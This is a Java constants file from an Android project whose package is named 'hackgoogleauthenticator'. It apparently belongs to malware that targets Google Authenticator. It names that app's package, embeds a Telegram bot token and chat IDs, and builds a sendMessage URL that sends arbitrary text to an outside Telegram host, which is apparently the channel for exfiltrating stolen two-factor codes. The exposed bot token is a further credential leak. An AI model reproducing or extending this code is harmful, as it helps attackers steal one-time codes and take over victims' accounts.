package com.josin.hackgoogleauthenticator.Utils;

public class Constans {
    public static final String google_authenticator_package_name = "com.google.android.apps.authenticator2";
    public static final String tg_chat_id = "-1001469466701";
    public static final String bot_token = "bot864873422:AAGIQHSg2A07_hyMxmqDYfmdnVT4db1yjyg";
    public static final String m1_tg_chat_id = "678630423";

    public  static String telegram_robot_send(String chat_id, String text) {
       return  "https://api.telegram.org/"+bot_token+"/sendMessage?chat_id="+chat_id+"&text="+text;
    }

}
